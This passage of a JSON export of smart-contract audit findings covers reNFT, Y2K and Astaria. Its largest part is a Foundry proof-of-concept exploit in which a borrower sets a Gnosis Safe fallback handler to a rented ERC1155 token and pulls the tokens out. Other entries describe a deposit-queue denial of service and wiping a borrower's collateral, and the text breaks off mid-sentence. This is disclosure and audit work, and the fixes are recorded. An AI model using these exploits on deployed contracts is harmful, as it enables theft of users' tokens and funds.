block.timestamp + metadata.rentDuration\n            });\n\n            // for each new offer item being rented, create a new item struct to add to the rental order\n            for (uint256 i = 0; i < parameters.offer.length; i++) {\n                // PAYEE orders cannot have offer items\n                require(\n                    metadata.orderType != OrderType.PAYEE,\n                    \"TEST: cannot have offer items in PAYEE order\"\n                );\n\n                // get the offer item\n                OfferItem memory offerItem = parameters.offer[i];\n\n                // determine the item type\n                RentalItemType itemType = _seaportItemTypeToRentalItemType(offerItem.itemType);\n\n                // determine which entity the payment will settle to\n                SettleTo settleTo = offerItem.itemType == SeaportItemType.ERC20\n                    ? SettleTo.RENTER\n                    : SettleTo.LENDER;\n\n                // create a new rental item\n                rentalOrder.items[i] = Item({\n                    itemType: itemType,\n                    settleTo: settleTo,\n                    token: offerItem.token,\n                    amount: offerItem.startAmount,\n                    identifier: offerItem.identifierOrCriteria\n                });\n            }\n\n            // for each consideration item in return, create a new item struct to add to the rental order\n            for (uint256 i = 0; i < parameters.consideration.length; i++) {\n                // PAY orders cannot have consideration items\n                require(\n                    metadata.orderType != OrderType.PAY,\n                    \"TEST: cannot have consideration items in PAY order\"\n                );\n\n                // get the offer item\n                ConsiderationItem memory considerationItem = parameters.consideration[i];\n\n                // determine the item type\n                RentalItemType itemType = _seaportItemTypeToRentalItemType(\n                    considerationItem.itemType\n                );\n\n                // determine which entity the payment will settle to\n                SettleTo settleTo = metadata.orderType == OrderType.PAYEE &&\n                    considerationItem.itemType == SeaportItemType.ERC20\n                    ? SettleTo.RENTER\n                    : SettleTo.LENDER;\n\n                // calculate item index offset\n                uint256 itemIndex = i + parameters.offer.length;\n\n                // create a new payment item\n                rentalOrder.items[itemIndex] = Item({\n                    itemType: itemType,\n                    settleTo: settleTo,\n                    token: considerationItem.token,\n                    amount: considerationItem.startAmount,\n                    identifier: considerationItem.identifierOrCriteria\n                });\n            }\n        }\n\n        function _signProtocolOrder(\n            uint256 signerPrivateKey,\n            bytes32 payloadHash\n        ) internal view returns (bytes memory signature) {\n            // fetch domain separator from create policy\n            bytes32 domainSeparator = create.domainSeparator();\n\n            // sign the EIP-712 digest\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(\n                signerPrivateKey,\n                domainSeparator.toTypedDataHash(payloadHash)\n            );\n\n            // encode the signature\n            signature = abi.encodePacked(r, s, v);\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                            Fulfillment Amendments                           //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function withFulfiller(ProtocolAccount memory _fulfiller) internal {\n            fulfiller = _fulfiller;\n        }\n\n        function withRecipient(address _recipient) internal {\n            seaportRecipient = _recipient;\n        }\n\n        function withAdvancedOrder(\n            AdvancedOrder memory _advancedOrder,\n            uint256 orderIndex\n        ) internal {\n            // get a storage pointer to the order to fulfill\n            OrderToFulfill storage orderToFulfill = ordersToFulfill[orderIndex];\n\n            // set the new advanced order\n            _createAdvancedOrder(orderToFulfill.advancedOrder, _advancedOrder);\n        }\n\n        function withSeaportMatchOrderFulfillment(Fulfillment memory _fulfillment) internal {\n            // get a pointer to a new seaport fulfillment\n            Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n            // set the fulfillment\n            _createSeaportFulfillment(\n                fulfillment,\n                Fulfillment({\n                    offerComponents: _fulfillment.offerComponents,\n                    considerationComponents: _fulfillment.considerationComponents\n                })\n            );\n        }\n\n        function withSeaportMatchOrderFulfillments(\n            Fulfillment[] memory fulfillments\n        ) internal {\n            // reset all current seaport match order fulfillments\n            resetSeaportMatchOrderFulfillments();\n\n            // add the new offer items to storage\n            for (uint256 i = 0; i < fulfillments.length; i++) {\n                // get a pointer to a new seaport fulfillment\n                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n                // set the fulfillment\n                _createSeaportFulfillment(\n                    fulfillment,\n                    Fulfillment({\n                        offerComponents: fulfillments[i].offerComponents,\n                        considerationComponents: fulfillments[i].considerationComponents\n                    })\n                );\n            }\n        }\n\n        function withBaseOrderFulfillmentComponents() internal {\n            // create offer fulfillments. We need to specify which offer items can be aggregated\n            // into one transaction. For example, 2 different orders where the same seller is offering\n            // the same item in each.\n            //\n            // Since BASE orders will only contain ERC721 offer items, these cannot be aggregated. So, a separate fulfillment\n            // is created for each order.\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                // get a pointer to a new offer fulfillment array. This array will contain indexes of\n                // orders and items which are all grouped on whether they can be combined in a single transferFrom()\n                FulfillmentComponent[] storage offerFulfillments = seaportOfferFulfillments\n                    .push();\n\n                // number of offer items in the order\n                uint256 offerItemsInOrder = ordersToFulfill[i]\n                    .advancedOrder\n                    .parameters\n                    .offer\n                    .length;\n\n                // add a single fulfillment component for each offer item in the order\n                for (uint256 j = 0; j < offerItemsInOrder; j++) {\n                    offerFulfillments.push(\n                        FulfillmentComponent({orderIndex: i, itemIndex: j})\n                    );\n                }\n            }\n\n            // create consideration fulfillments. We need to specify which consideration items can be aggregated\n            // into one transaction. For example, 3 different orders where the same fungible consideration items are\n            // expected in return.\n            //\n            // get a pointer to a new offer fulfillment array. This array will contain indexes of\n            // orders and items which are all grouped on whether they can be combined in a single transferFrom()\n            FulfillmentComponent[]\n                storage considerationFulfillments = seaportConsiderationFulfillments.push();\n\n            // BASE orders will only contain ERC20 items, these are fungible and are candidates for aggregation. Because\n            // all of these BASE orders will be fulfilled by the same EOA, and all ERC20 consideration items are going to the\n            // ESCRW contract, the consideration items can be aggregated. In other words, Seaport will only make a single transfer\n            // of ERC20 tokens from the fulfiller EOA to the payment escrow contract.\n            //\n            // put all fulfillments into one which can be an aggregated transfer\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                considerationFulfillments.push(\n                    FulfillmentComponent({orderIndex: i, itemIndex: 0})\n                );\n            }\n        }\n\n        function withLinkedPayAndPayeeOrders(\n            uint256 payOrderIndex,\n            uint256 payeeOrderIndex\n        ) internal {\n            // get the PAYEE order\n            OrderParameters memory payeeOrder = ordersToFulfill[payeeOrderIndex]\n                .advancedOrder\n                .parameters;\n\n            // For each consideration item in the PAYEE order, a fulfillment should be\n            // constructed with a corresponding item from the PAY order's offer items.\n            for (uint256 i = 0; i < payeeOrder.consideration.length; ++i) {\n                // define the offer components\n                FulfillmentComponent[] memory offerComponents = new FulfillmentComponent[](1);\n                offerComponents[0] = FulfillmentComponent({\n                    orderIndex: payOrderIndex,\n                    itemIndex: i\n                });\n\n                // define the consideration components\n                FulfillmentComponent[]\n                    memory considerationComponents = new FulfillmentComponent[](1);\n                considerationComponents[0] = FulfillmentComponent({\n                    orderIndex: payeeOrderIndex,\n                    itemIndex: i\n                });\n\n                // get a pointer to a new seaport fulfillment\n                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n                // set the fulfillment\n                _createSeaportFulfillment(\n                    fulfillment,\n                    Fulfillment({\n                        offerComponents: offerComponents,\n                        considerationComponents: considerationComponents\n                    })\n                );\n            }\n        }\n\n        function resetFulfiller() internal {\n            delete fulfiller;\n        }\n\n        function resetOrdersToFulfill() internal {\n            delete ordersToFulfill;\n        }\n\n        function resetSeaportMatchOrderFulfillments() internal {\n            delete seaportMatchOrderFulfillments;\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                           Fulfillment Finalization                          //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function _finalizePayOrderFulfillment(\n            bytes memory expectedError\n        )\n            private\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            // get the orders to fulfill\n            OrderToFulfill memory payOrder = ordersToFulfill[0];\n            OrderToFulfill memory payeeOrder = ordersToFulfill[1];\n\n            // create rental orders\n            payRentalOrder = _createRentalOrder(payOrder);\n            payeeRentalOrder = _createRentalOrder(payeeOrder);\n\n            // expect an error if error data was provided\n            if (expectedError.length != 0) {\n                vm.expectRevert(expectedError);\n            }\n            // otherwise, expect the relevant event to be emitted.\n            else {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(payRentalOrder),\n                    payOrder.payload.metadata.emittedExtraData,\n                    payRentalOrder.seaportOrderHash,\n                    payRentalOrder.items,\n                    payRentalOrder.hooks,\n                    payRentalOrder.orderType,\n                    payRentalOrder.lender,\n                    payRentalOrder.renter,\n                    payRentalOrder.rentalWallet,\n                    payRentalOrder.startTimestamp,\n                    payRentalOrder.endTimestamp\n                );\n            }\n\n            // the offerer of the PAYEE order fulfills the orders.\n            vm.prank(fulfiller.addr);\n\n            // fulfill the orders\n            seaport.matchAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportMatchOrderFulfillments,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizePayOrderFulfillment()\n            internal\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(bytes(\"\"));\n        }\n\n        function finalizePayOrderFulfillmentWithError(\n            bytes memory expectedError\n        )\n            internal\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(expectedError);\n        }\n\n        function _finalizeBaseOrderFulfillment(\n            bytes memory expectedError\n        ) private returns (RentalOrder memory rentalOrder) {\n            // get the order to fulfill\n            OrderToFulfill memory baseOrder = ordersToFulfill[0];\n\n            // create a rental order\n            rentalOrder = _createRentalOrder(baseOrder);\n\n            // expect an error if error data was provided\n            if (expectedError.length != 0) {\n                vm.expectRevert(expectedError);\n            }\n            // otherwise, expect the relevant event to be emitted.\n            else {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(rentalOrder),\n                    baseOrder.payload.metadata.emittedExtraData,\n                    rentalOrder.seaportOrderHash,\n                    rentalOrder.items,\n                    rentalOrder.hooks,\n                    rentalOrder.orderType,\n                    rentalOrder.lender,\n                    rentalOrder.renter,\n                    rentalOrder.rentalWallet,\n                    rentalOrder.startTimestamp,\n                    rentalOrder.endTimestamp\n                );\n            }\n\n            // the owner of the rental wallet fulfills the advanced order, and marks the rental wallet\n            // as the recipient\n            vm.prank(fulfiller.addr);\n            seaport.fulfillAdvancedOrder(\n                baseOrder.advancedOrder,\n                new CriteriaResolver[](0),\n                conduitKey,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizeBaseOrderFulfillment()\n            internal\n            returns (RentalOrder memory rentalOrder)\n        {\n            rentalOrder = _finalizeBaseOrderFulfillment(bytes(\"\"));\n        }\n\n        function finalizeBaseOrderFulfillmentWithError(\n            bytes memory expectedError\n        ) internal returns (RentalOrder memory rentalOrder) {\n            rentalOrder = _finalizeBaseOrderFulfillment(expectedError);\n        }\n\n        function finalizeBaseOrdersFulfillment()\n            internal\n            returns (RentalOrder[] memory rentalOrders)\n        {\n            // Instantiate rental orders\n            uint256 numOrdersToFulfill = ordersToFulfill.length;\n            rentalOrders = new RentalOrder[](numOrdersToFulfill);\n\n            // convert each order to fulfill into a rental order\n            for (uint256 i = 0; i < numOrdersToFulfill; i++) {\n                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);\n            }\n\n            // Expect the relevant events to be emitted.\n            for (uint256 i = 0; i < rentalOrders.length; i++) {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(rentalOrders[i]),\n                    ordersToFulfill[i].payload.metadata.emittedExtraData,\n                    rentalOrders[i].seaportOrderHash,\n                    rentalOrders[i].items,\n                    rentalOrders[i].hooks,\n                    rentalOrders[i].orderType,\n                    rentalOrders[i].lender,\n                    rentalOrders[i].renter,\n                    rentalOrders[i].rentalWallet,\n                    rentalOrders[i].startTimestamp,\n                    rentalOrders[i].endTimestamp\n                );\n            }\n\n            // the owner of the rental wallet fulfills the advanced orders, and marks the rental wallet\n            // as the recipient\n            vm.prank(fulfiller.addr);\n            seaport.fulfillAvailableAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportOfferFulfillments,\n                seaportConsiderationFulfillments,\n                conduitKey,\n                seaportRecipient,\n                ordersToFulfill.length\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizePayOrdersFulfillment()\n            internal\n            returns (RentalOrder[] memory rentalOrders)\n        {\n            // Instantiate rental orders\n            uint256 numOrdersToFulfill = ordersToFulfill.length;\n            rentalOrders = new RentalOrder[](numOrdersToFulfill);\n\n            // convert each order to fulfill into a rental order\n            for (uint256 i = 0; i < numOrdersToFulfill; i++) {\n                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);\n            }\n\n            // Expect the relevant events to be emitted.\n            for (uint256 i = 0; i < rentalOrders.length; i++) {\n                // only expect the event if its a PAY order\n                if (ordersToFulfill[i].payload.metadata.orderType == OrderType.PAY) {\n                    vm.expectEmit({emitter: address(create)});\n                    emit Events.RentalOrderStarted(\n                        create.getRentalOrderHash(rentalOrders[i]),\n                        ordersToFulfill[i].payload.metadata.emittedExtraData,\n                        rentalOrders[i].seaportOrderHash,\n                        rentalOrders[i].items,\n                        rentalOrders[i].hooks,\n                        rentalOrders[i].orderType,\n                        rentalOrders[i].lender,\n                        rentalOrders[i].renter,\n                        rentalOrders[i].rentalWallet,\n                        rentalOrders[i].startTimestamp,\n                        rentalOrders[i].endTimestamp\n                    );\n                }\n            }\n\n            // the offerer of the PAYEE order fulfills the orders. For this order, it shouldn't matter\n            // what the recipient address is\n            vm.prank(fulfiller.addr);\n            seaport.matchAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportMatchOrderFulfillments,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function _deconstructOrdersToFulfill()\n            private\n            view\n            returns (AdvancedOrder[] memory advancedOrders)\n        {\n            // get the length of the orders to fulfill\n            advancedOrders = new AdvancedOrder[](ordersToFulfill.length);\n\n            // build up the advanced orders\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                advancedOrders[i] = ordersToFulfill[i].advancedOrder;\n            }\n        }\n    }\n\n    contract SetupReNFT is OrderFulfiller {}\n\n</details>\n\n<details>\n<summary><b>Exploit.sol</b></summary>\n<br>\n\n    // SPDX-License-Identifier: BUSL-1.1\n    pragma solidity ^0.8.20;\n\n    import {\n        Order,\n        FulfillmentComponent,\n        Fulfillment,\n        ItemType as SeaportItemType\n    } from \"@seaport-types/lib/ConsiderationStructs.sol\";\n\n    import {OrderType, OrderMetadata, RentalOrder} from \"@src/libraries/RentalStructs.sol\";\n\n    import {SetupReNFT} from \"./SetupExploit.sol\";\n    import {Assertions} from \"@test/utils/Assertions.sol\";\n    import {Constants} from \"@test/utils/Constants.sol\";\n    import {SafeUtils} from \"@test/utils/GnosisSafeUtils.sol\";\n    import {Enum} from \"@safe-contracts/common/Enum.sol\";\n    import \"forge-std/console.sol\";\n\n\n\n    contract Exploit is SetupReNFT, Assertions, Constants {\n\n        function test_ERC721_1155_Exploit() public {\n\n            vm.stopPrank();\n\n            /////////////////////////////////////////////\n            // Order Creation & Fulfillment simulation //\n            /////////////////////////////////////////////\n\n            // Alice creates a BASE order\n            createOrder({\n                offerer: alice,\n                orderType: OrderType.BASE,\n                erc721Offers: 0,\n                erc1155Offers: 1,\n                erc20Offers: 0,\n                erc721Considerations: 0,\n                erc1155Considerations: 0,\n                erc20Considerations: 1\n            });\n\n            // Finalize the order creation\n            (\n                Order memory order,\n                bytes32 orderHash,\n                OrderMetadata memory metadata\n            ) = finalizeOrder();\n            \n\n            // Create an order fulfillment\n            createOrderFulfillment({\n                _fulfiller: attacker,\n                order: order,\n                orderHash: orderHash,\n                metadata: metadata\n            });\n\n            // Finalize the base order fulfillment\n            RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();\n\n            // get the rental order hash\n            bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);\n\n\n            // Assert that the rental order was stored\n            assertEq(STORE.orders(rentalOrderHash), true);\n\n            // Assert that the token is in storage\n            assertEq(STORE.isRentedOut(address(attacker.safe), address(erc1155s[0]), 0), true);\n\n            // assert that the fulfiller made a payment\n            assertEq(erc20s[0].balanceOf(attacker.addr), uint256(9900));\n\n            // assert that a payment was made to the escrow contract\n            assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));\n\n            // assert that a payment was synced properly in the escrow contract\n            assertEq(ESCRW.balanceOf(address(erc20s[0])), uint256(100));\n\n\n            // Impersonate the attacker\n            vm.startPrank(attacker.addr);\n\n            // The `setFallbackHandler` TX\n            bytes memory transaction = abi.encodeWithSelector(\n                Safe.setFallbackHandler.selector,\n                address(address(erc1155s[0]))\n            );\n\n            // The signature of the `setFallbackHandler` TX\n            bytes memory transactionSignature = SafeUtils.signTransaction(\n                address(attacker.safe),\n                attacker.privateKey,\n                address(attacker.safe),\n                transaction\n            );\n\n            // Execute the transaction on attacker's safe\n            SafeUtils.executeTransaction(\n                address(attacker.safe),\n                address(attacker.safe),\n                transaction,\n                transactionSignature\n            );\n\n            /** ----------------- Exploitation ----------------- */\n\n            // TX calldata\n            bytes memory hijackTX = abi.encodeWithSignature(\n                \"safeTransferFrom(address,address,uint256,uint256,bytes)\",\n                address(attacker.safe),\n                address(attacker.addr),\n                0,\n                100,\n                \"\"\n            );\n\n            // The exploit\n            (bool tx_success, ) = address(attacker.safe).call(\n                hijackTX\n            );\n\n\n            /** ----------------- Exploit proof ----------------- */\n\n            uint256 attackersBalance = erc1155s[0].balanceOf(address(attacker.addr), 0);\n            uint256 attackersSafeBalance = erc1155s[0].balanceOf(address(attacker.safe), 0);\n\n            if (tx_success && attackersSafeBalance == uint256(0) && attackersBalance == uint256(100)) {\n                console.log(\"Tokens successfully hijacked from the attacker's (borrower) safe!\");\n            }\n\n\n        }\n\n    }\n\n\n    interface Safe {\n        function execTransaction(\n            address to,\n            uint256 value,\n            bytes calldata data,\n            Enum.Operation operation,\n            uint256 safeTxGas,\n            uint256 baseGas,\n            uint256 gasPrice,\n            address gasToken,\n            address payable refundReceiver,\n            bytes memory signatures\n        ) external payable returns (bool success);\n\n        function setFallbackHandler(address handler) external;\n    }\n\n</details>\n\n***\n\n### Impact\n\n***\n\nThis severe vulnerability allows an attacker to hijack ANY ERC721 or ERC1155 tokens he rents.\n\n***\n\n### Remediation\n\n***\n\nIn the guard, check if the TX is a call to the function `setFallbackHandler()`. If it is, then ensure that the address supplied to that function is not an address of an actively rented ERC721/1155 token.\nAdditionally, if the borrower rents a new token, ensure that the already set fallback handler address isn't the same as the newly-rented token address.\n\n***\n\n**[0xean (Judge) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/593#issuecomment-1912610639):**\n > H seems appropriate here, direct loss of assets. \n\n**[Alec1017 (reNFT) confirmed and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/593#issuecomment-1914950594):**\n > PoC on this one was confirmed. Direct loss of assets.\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/4) - Adds check to prevent setting of the fallback handler by the safe owner.\n\n**Status:** Mitigation confirmed. Full details in reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/42), [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/31) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/3).\n\n***\n\n",
      "summary": "\nThe report discusses two features of the Gnosis safe: fallback handlers and guards. Fallback handlers allow for flexibility in handling unknown functions, while guards act as a defense against malicious function calls. However, the report highlights a vulnerability in the guard feature that allows an attacker to hijack any ERC721 or ERC1155 token rented through the safe. The steps to exploit this vulnerability are outlined, and a proof of concept is provided. To run the proof of concept, specific files must be added to the test folder and a command must be run. The report concludes by mentioning the need for validation and checks in the `setFallbackHandler()` function to prevent such attacks.",
      "report_date": {},
      "contest_prize_txt": "83600",
      "contest_link": "https://code4rena.com/reports/2024-01-renft",
      "sponsor_name": "reNFT",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 5,
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/593",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "317",
      "slug": "h-02-an-attacker-is-able-to-hijack-any-erc721-erc1155-he-borrows-because-guard-is-missing-validation-on-the-address-supplied-to-function-call-setfallbackhandler-code4rena-renft-renft-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "reNFT",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "reNFT",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "NFT Lending"
            },
            "score": 1391.208791137663
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC721"
          }
        },
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        }
      ]
    },
    {
      "id": "18537",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "HIGH",
      "finders_count": 18,
      "protocol_id": "613",
      "title": "H-5: Adversary can break deposit queue and cause loss of funds",
      "content": "Source: https://github.com/sherlock-audit/2023-03-Y2K-judging/issues/468 \n\n## Found by \n0x52, 0xRobocop, Bauer, HonorLt, Respx, Ruhum, VAD37, bin2chen, immeas, joestakey, jprod15, libratus, ltyu, mstpr-brainbot, nobody2018, roguereddwarf, warRoom, yixxas\n\n## Summary\n\n\n\n## Vulnerability Detail\n\n[Carousel.sol#L531-L538](https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/Carousel/Carousel.sol#L531-L538)\n\n    function _mintShares(\n        address to,\n        uint256 id,\n        uint256 amount\n    ) internal {\n        _mint(to, id, amount, EMPTY);\n        _mintEmissions(to, id, amount);\n    }\n\nWhen processing deposits for the deposit queue, it _mintShares to the specified receiver which makes a _mint subcall.\n\n[ERC1155.sol#L263-L278](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ca822213f2275a14c26167bd387ac3522da67fe9/contracts/token/ERC1155/ERC1155.sol#L263-L278)\n\n    function _mint(address to, uint256 id, uint256 amount, bytes memory data) internal virtual {\n        require(to != address(0), \"ERC1155: mint to the zero address\");\n\n        address operator = _msgSender();\n        uint256[] memory ids = _asSingletonArray(id);\n        uint256[] memory amounts = _asSingletonArray(amount);\n\n        _beforeTokenTransfer(operator, address(0), to, ids, amounts, data);\n\n        _balances[id][to] += amount;\n        emit TransferSingle(operator, address(0), to, id, amount);\n\n        _afterTokenTransfer(operator, address(0), to, ids, amounts, data);\n\n        _doSafeTransferAcceptanceCheck(operator, address(0), to, id, amount, data);\n    }\n\nThe base ERC1155 _mint is used which always behaves the same way that ERC721 safeMint does, that is, it always calls _doSafeTrasnferAcceptanceCheck which makes a call to the receiver. A malicious user can make the receiver always revert. This breaks the deposit queue completely. Since deposits can't be canceled this WILL result in loss of funds to all users whose deposits are blocked. To make matters worse it uses first in last out so the attacker can trap all deposits before them\n\n## Impact\n\nUsers who deposited before the adversary will lose their entire deposit\n\n## Code Snippet\n\n[Carousel.sol#L310-L355](https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/Carousel/Carousel.sol#L310-L355)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nOverride _mint to remove the safeMint behavior so that users can't DOS the deposit queue\n\n\n\n## Discussion\n\n**3xHarry**\n\nagree with this issue, there is no easy solution to this, as by definition when depositing into queue, the user gives up the atomicity of his intended mint. [Looking at Openzeppelins 1155 implementation guide ](https://docs.openzeppelin.com/contracts/3.x/erc1155) it is recommended to ensure the receiver of the asset is able to call safeTransferFrom. By removing the acceptance check in the `_mint` function, funds could be stuck in a smart contract. \n\nAnother alternative would be to do the 1155 acceptance check in the mint function and confiscate the funds if the receiver is not able to hold 1155s. The funds could be retrieved via a manual process from the treasury afterward. \n\n**3xHarry**\n\ngoing with Recommendation is prob the easiest way\n\n**3xHarry**\n\nfix PR: https://github.com/Y2K-Finance/Earthquake/pull/124\n\n**IAm0x52**\n\nFix looks good. _mint no longer calls acceptance check so rollover can longer be DOS'd by it",
      "summary": "\nA bug was found in the Carousel.sol and ERC1155.sol files of the Y2K-Finance/Earthquake project. When processing deposits for the deposit queue, it _mintShares to the specified receiver which makes a _mint subcall. The base ERC1155 _mint is used which always behaves the same way that ERC721 safeMint does, that is, it always calls _doSafeTrasnferAcceptanceCheck which makes a call to the receiver. A malicious user can make the receiver always revert, which breaks the deposit queue completely and leads to the loss of funds for all users whose deposits are blocked.\n\nThe impact of this bug is that users who deposited before the adversary will lose their entire deposit. The code snippet for this bug can be found at Carousel.sol#L310-L355. This bug was found by 0x52, 0xRobocop, Bauer, HonorLt, Respx, Ruhum, VAD37, bin2chen, immeas, joestakey, jprod15, libratus, ltyu, mstpr-brainbot, nobody2018, roguereddwarf, warRoom, yixxas, who used manual review as a tool. \n\nThe recommendation to fix this bug is to override _mint to remove the safeMint behavior so that users can't DOS the deposit queue. This was discussed by 3xHarry, who agreed with the issue and suggested that Openzeppelin's 1155 implementation guide could be used to ensure the receiver of the asset is able to call safeTransferFrom, or to do the 1155 acceptance check in the mint function and confiscate the funds if the receiver is not able to hold 1155s. The funds could then be retrieved via a manual process from the treasury afterward. 3xHarry also provided a fix PR for this issue, which was approved by IAm0x52.",
      "report_date": {},
      "contest_prize_txt": "50000 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/57",
      "sponsor_name": null,
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-03-Y2K-judging/issues/468",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "57",
      "slug": "h-5-adversary-can-break-deposit-queue-and-cause-loss-of-funds-sherlock-none-y2k-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Y2K",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Y2K",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        },
        {
          "tags_tag": {
            "title": "Denial-Of-Service"
          }
        }
      ]
    },
    {
      "id": "25808",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 4,
      "protocol_id": "41",
      "title": "[H-13] Anyone can wipe complete state of any collateral at any point",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L114-L167><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L524-L545><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L497-L510><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L623-L656>\n\nThe Clearing House is implemented as an ERC1155. This is used to settle up at the end of an auction. The Clearing House's token is listed as one of the Consideration Items, and when Seaport goes to transfer it, it triggers the settlement process.\n\nThis settlement process includes deleting the collateral state hash from LienToken.sol, burning all lien tokens, deleting the idToUnderlying mapping, and burning the collateral token. **These changes effectively wipe out all record of the liens, as well as removing any claim the borrower has on their underlying collateral.**\n\nAfter an auction, this works as intended. The function verifies that sufficient payment has been made to meet the auction criteria, and therefore all these variables should be zeroed out.\n\nHowever, the issue is that there is no check that this safeTransferFrom function is being called after an auction has completed. In the case that it is called when there is no auction, all the auction criteria will be set to 0, and therefore the above deletions can be performed with a payment of 0.\n\nThis allows any user to call the `safeTransferFrom()` function for any other user's collateral. This will wipe out all the liens on that collateral, and burn the borrower's collateral token, and with it their ability to ever reclaim their collateral.\n\n### Proof of Concept\n\nThe flow is as follows:\n\n*   safeTransferFrom(offerer, buyer, paymentToken, amount, data)\n*   \\_execute(offerer, buyer, paymentToken, amount)\n*   using the auctionStack in storage, it calculates the amount the auction would currently be listed at\n*   it confirms that the Clearing House has already received sufficient paymentTokens for this amount\n*   it then transfers the liquidator their payment (currently 13%)\n*   it calls `LienToken#payDebtViaClearingHouse()`, which pays back all liens, zeros out all lien storage and deletes the collateralStateHash\n*   if there is any remaining balance of paymentToken, it transfers it to the owner of the collateral\n*   it then calls `Collateral#settleAuction()`, which deletes idToUnderlying, collateralIdToAuction and burns the collateral token\n\nIn the case where the auction hasn't started, the `auctionStack` in storage is all set to zero. When it calculates the payment that should be made, it uses `_locateCurrentAmount`, which simply returns `endAmount` if `startAmount == endAmount`. In the case where they are all 0, this returns 0.\n\nThe second check that should catch this occurs in `settleAuction()`:\n\n        if (\n          s.collateralIdToAuction[collateralId] == bytes32(0) &&\n          ERC721(s.idToUnderlying[collateralId].tokenContract).ownerOf(\n            s.idToUnderlying[collateralId].tokenId\n          ) !=\n          s.clearingHouse[collateralId]\n        ) {\n          revert InvalidCollateralState(InvalidCollateralStates.NO_AUCTION);\n        }\n\nHowever, this check accidentally uses an 